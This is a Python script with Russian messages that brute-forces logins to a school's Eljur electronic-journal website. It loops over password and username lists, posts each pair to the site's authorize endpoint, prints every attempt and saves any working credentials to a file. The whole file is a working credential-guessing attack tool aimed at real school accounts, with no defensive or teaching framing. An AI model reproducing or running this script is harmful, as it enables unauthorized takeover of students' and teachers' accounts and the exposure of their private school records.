from ast import For
from turtle import pos
from requests import post, get
from database import paswords, usernames
from colorama import Fore, Back, Style, init
import time
from config import processes, schooldomain
init()

def init(processes, schooldomain):
    print(Fore.YELLOW + 'Подключаюсь к школе...')
    if get(f'https://{schooldomain}.eljur.ru').status_code == 200:
        print(Fore.GREEN + 'Подключение к школе прошло успешно! Начинаю подбор...')
        solve(schooldomain)
    else: print(Fore.RED + f'Не удалось подключиться к школе {schooldomain}! Проверьте правильность домена в файле config.py!')

def solve(schooldomain):
    for i in paswords:
        for x in usernames:
            start_time = time.time()
            params= {
                'username':x,
                'password':i
            }
            req = post(f'https://{schooldomain}.eljur.ru/ajaxauthorize', params=params)
            answ = req.json()['result']
            if answ is False:
                print(Fore.RED + f'Пробую - {x}:{i} | Ошибка | {round((time.time() - start_time)*1000)}ms')
            else:
                print(Fore.GREEN + f'Пробую - {x}:{i} | Данные верны | {round((time.time() - start_time)*1000)}ms')
                f = open('truedata.txt', 'w')
                f.write(f'{x}:{i}')
                try:
                    f.close()    
                except:
                    print(Fore.MAGENTA + f'[ERROR] Initial Error' )
if __name__ == "__main__":
    if schooldomain == '':
        print(Back.RED, Fore.BLACK + 'Ошибка! Укажите домен школы в файле config.py')
    elif processes == 0:
        print(Back.RED, Fore.BLACK + 'Ошибка! Число процессов не может быть равно нулю')
    else:
        init(processes, schooldomain)